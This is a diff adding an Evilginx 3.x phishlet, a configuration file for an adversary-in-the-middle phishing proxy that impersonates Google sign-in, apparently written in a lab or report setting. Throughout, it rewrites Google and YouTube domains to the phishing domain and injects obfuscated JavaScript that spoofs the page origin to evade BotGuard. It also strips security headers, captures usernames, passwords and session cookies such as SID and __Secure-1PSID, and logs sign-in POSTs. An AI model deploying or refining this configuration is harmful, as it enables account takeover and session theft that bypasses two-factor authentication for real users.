@@ -1,0 +1,138 @@
+# ============================================================================
+# google.com.yaml -- Google phishlet for Evilginx 3.x
+# ----------------------------------------------------------------------------
+# DEBUG: if login stalls after entering the email, open F12 > Network on
+# the lure page and look for red requests (404/CORS). Check that the
+# target URL contains <subdomain>.yourdomain.com, not google.com.
+# BUT: as indicated in the README, BotGuard will catch you...
+# ----------------------------------------------------------------------------
+author: 'lab'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'accounts',    orig_sub: 'accounts',    domain: 'google.com',       session: true, is_landing: true}
+  - {phish_sub: 'www',         orig_sub: 'www',         domain: 'google.com',       session: true}
+  - {phish_sub: 'mail',        orig_sub: 'mail',        domain: 'google.com',       session: true}
+  - {phish_sub: 'myaccount',   orig_sub: 'myaccount',   domain: 'google.com',       session: true}
+  - {phish_sub: 'apis',        orig_sub: 'apis',        domain: 'google.com',       session: true}
+  - {phish_sub: 'ogs',         orig_sub: 'ogs',         domain: 'google.com',       session: true}
+  - {phish_sub: 'play',        orig_sub: 'play',        domain: 'google.com',       session: true}
+  - {phish_sub: 'ssl',         orig_sub: 'ssl',         domain: 'gstatic.com',      session: false}
+  - {phish_sub: 'gstatic-www', orig_sub: 'www',         domain: 'gstatic.com',      session: false}
+  - {phish_sub: 'fonts',       orig_sub: 'fonts',       domain: 'googleapis.com',   session: false}
+  - {phish_sub: 'content',     orig_sub: 'content',     domain: 'googleapis.com',   session: false}
+  - {phish_sub: 'console',     orig_sub: 'console',     domain: 'cloud.google.com', session: true}
+  - {phish_sub: 'youtube-accounts', orig_sub: 'accounts', domain: 'youtube.com',      session: false}
+  - {phish_sub: 'youtube-www', orig_sub: 'www',         domain: 'youtube.com',      session: false}
+#  - {phish_sub: 'support',     orig_sub: 'support',     domain: 'google.com',       session: false}
+
+sub_filters:
+  # HTML / JSON / JS: domain rewrites to phishlet subdomains
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'accounts\.google\.com',            replace: 'accounts.{domain}',    mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'myaccount\.google\.com',           replace: 'myaccount.{domain}',   mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'mail\.google\.com',                replace: 'mail.{domain}',        mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'ogs\.google\.com',                 replace: 'ogs.{domain}',         mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'play\.google\.com',                replace: 'play.{domain}',        mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'apis\.google\.com',                replace: 'apis.{domain}',        mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'www\.google\.com',                 replace: 'www.{domain}',         mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'console\.cloud\.google\.com',     replace: 'console.{domain}',     mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'ssl\.gstatic\.com',                replace: 'ssl.{domain}',         mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'www\.gstatic\.com',                replace: 'gstatic-www.{domain}', mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'fonts\.googleapis\.com',           replace: 'fonts.{domain}',       mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'content\.googleapis\.com',         replace: 'content.{domain}',     mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'accounts\.youtube\.com',           replace: 'youtube-accounts.{domain}', mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'www\.youtube\.com',                replace: 'youtube-www.{domain}', mimes: ['text/html','application/json','text/javascript','application/javascript']}
+#  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'support\.google\.com',             replace: 'support.{domain}',     mimes: ['text/html','application/json','text/javascript','application/javascript']}
+
+  # ANTI-DETECTION pmpo PATCH: the pmpo parameter (parent page origin) of YouTube's
+  # CheckConnection is checked for CORS authorization. We force it to the legit accounts.google.com.
+  # Covers 4 encoding variants observed in traffic (unicode, URL-encoded, double-encoded, plain).
+  # The regex [^&"\s]+ matches any domain -- no hardcoded domain name.
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'pmpo\\u003dhttps://accounts\.[^&"\s]+',        replace: 'pmpo\\u003dhttps://accounts.google.com',          mimes: ['text/html','application/json','text/javascript','application/x-www-form-urlencoded']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'pmpo%5Cu003dhttps%3A%2F%2Faccounts\.[^&"\s]+',  replace: 'pmpo%5Cu003dhttps%3A%2F%2Faccounts.google.com',   mimes: ['text/html','application/json','text/javascript','application/x-www-form-urlencoded']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'pmpo=https://accounts\.[^&"\s]+',               replace: 'pmpo=https://accounts.google.com',                mimes: ['text/html','application/json','text/javascript','application/x-www-form-urlencoded']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: 'pmpo%3[dD]https%3A%2F%2Faccounts\.[^&"\s]+',    replace: 'pmpo%3dhttps%3A%2F%2Faccounts.google.com',        mimes: ['text/html','application/json','text/javascript','application/x-www-form-urlencoded']}
+
+  # Same rewrites from other origins (JS loaded on myaccount, mail, etc.)
+  - {triggers_on: 'myaccount.google.com',   orig_sub: 'myaccount', domain: 'google.com',       search: 'accounts\.google\.com',            replace: 'accounts.{domain}',    mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'mail.google.com',        orig_sub: 'mail',      domain: 'google.com',       search: 'accounts\.google\.com',            replace: 'accounts.{domain}',    mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'console.cloud.google.com',orig_sub: 'console',  domain: 'cloud.google.com', search: 'accounts\.google\.com',            replace: 'accounts.{domain}',    mimes: ['text/html','application/json','text/javascript','application/javascript']}
+
+  # Rewrites from YouTube origins (CheckConnection CORS)
+  - {triggers_on: 'accounts.youtube.com',   orig_sub: 'accounts',  domain: 'youtube.com',      search: 'accounts\.google\.com',            replace: 'accounts.{domain}',    mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'accounts.youtube.com',   orig_sub: 'accounts',  domain: 'youtube.com',      search: 'accounts\.youtube\.com',           replace: 'youtube-accounts.{domain}', mimes: ['text/html','application/json','text/javascript','application/javascript']}
+  - {triggers_on: 'www.youtube.com',        orig_sub: 'www',       domain: 'youtube.com',      search: 'accounts\.google\.com',            replace: 'accounts.{domain}',    mimes: ['text/html','application/json','text/javascript','application/javascript']}
+
+  # Rewrites from support.google.com
+  - {triggers_on: 'support.google.com',     orig_sub: 'support',   domain: 'google.com',       search: 'accounts\.google\.com',            replace: 'accounts.{domain}',    mimes: ['text/html','application/json','text/javascript','application/javascript']}
+
+  # =====================================================================================
+  # ANTI-BOTGUARD JS INJECTION
+  # -------------------------------------------------------------------------------------
+  # BotGuard captures window.location.origin in a signed token sent with MI613e.
+  # If origin != accounts.google.com, the server rejects with rrk=46.
+  #
+  # This script is injected before any other JS and attempts to override
+  # Location.prototype properties (origin, hostname, host, href) + document
+  # (domain, URL, documentURI, referrer) to return accounts.google.com
+  # instead of the phishing domain.
+  #
+  # Cascading strategies:
+  #   1. Object.defineProperty (works if configurable:true)
+  #   2. __defineGetter__      (fallback for older Chrome versions)
+  #   3. Silent failure        (no breakage if neither method succeeds)
+  #
+  # IMPORTANT: Chrome protects Location.prototype (configurable:false on recent
+  # versions). If this script is not enough, consider the Browser-in-the-Middle
+  # approach (see report section 8.5).
+  #
+  # The real domain is built by JS concatenation (join) to prevent the
+  # rewriting sub_filters from turning it into the phishing domain.
+  # {domain} in the replace field is expanded by Evilginx to the actual phishing domain.
+  # =====================================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '<head>', replace: '<head><script>(function(){var P="accounts.{domain}",R=["accounts","google","com"].join("."),LP=Location.prototype;function rp(v){return typeof v==="string"?v.split(P).join(R):v}function td(o,p,g,s){try{Object.defineProperty(o,p,{get:g,set:s,configurable:!0,enumerable:!0})}catch(e){try{o.__defineGetter__(p,g)}catch(x){}}}var oG={};["origin","hostname","host","href"].forEach(function(p){try{oG[p]=Object.getOwnPropertyDescriptor(LP,p)}catch(e){}});if(oG.origin&&oG.origin.get)td(LP,"origin",function(){return rp(oG.origin.get.call(this))});if(oG.hostname&&oG.hostname.get)td(LP,"hostname",function(){return rp(oG.hostname.get.call(this))});if(oG.host&&oG.host.get)td(LP,"host",function(){return rp(oG.host.get.call(this))});if(oG.href&&oG.href.get)td(LP,"href",function(){return rp(oG.href.get.call(this))},oG.href.set);try{LP.toString=function(){return this.href}}catch(e){}try{td(document,"domain",function(){return["google","com"].join(".")},function(){})}catch(e){}try{td(document,"URL",function(){return rp(location.href)})}catch(e){}try{td(document,"documentURI",function(){return rp(location.href)})}catch(e){}try{var _r=Object.getOwnPropertyDescriptor(Document.prototype,"referrer");if(_r&&_r.get)td(document,"referrer",function(){return rp(_r.get.call(this))})}catch(e){}})()</script>', mimes: ['text/html']}
+
+  # Strip protections that prevent loading (headers + meta tags)
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: '<meta[^>]*content-security-policy[^>]*>', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: '(?i)content-security-policy',      replace: '', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: '(?i)x-frame-options',              replace: '', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com',    orig_sub: 'accounts',  domain: 'google.com',       search: '(?i)referrer-policy',              replace: '', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID','HSID','SSID','APISID','SAPISID','LSID','1P_JAR','NID','__Secure-1PSID','__Secure-1PAPISID','__Secure-3PSID','__Secure-3PAPISID','__Host-GAPS']
+  - domain: '.cloud.google.com'
+    keys: ['SID','HSID','SSID','APISID','SAPISID']
+
+# Not good, must be modified
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: post
+  password:
+    key: 'Passwd'
+    search: '(.*)'
+    type: post
+
+post:
+  # Force interception of critical AJAX POSTs during the Google signin flow
+  - path: '/v3/signin/identifier'
+    search:
+      - {key: 'identifier', search: '(.*)'}
+  - path: '/v3/signin/challenge/pwd'
+    search:
+      - {key: 'Passwd', search: '(.*)'}
+  - path: '/_/signin/sl/lookup'
+    search:
+      - {key: 'f.req', search: '(.+)'}
+  - path: '/_/signin/sl/challenge'
+    search:
+      - {key: 'f.req', search: '(.+)'}
+  - path: '/_/signin/selective'
+    search:
+      - {key: 'f.req', search: '(.+)'}
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin'
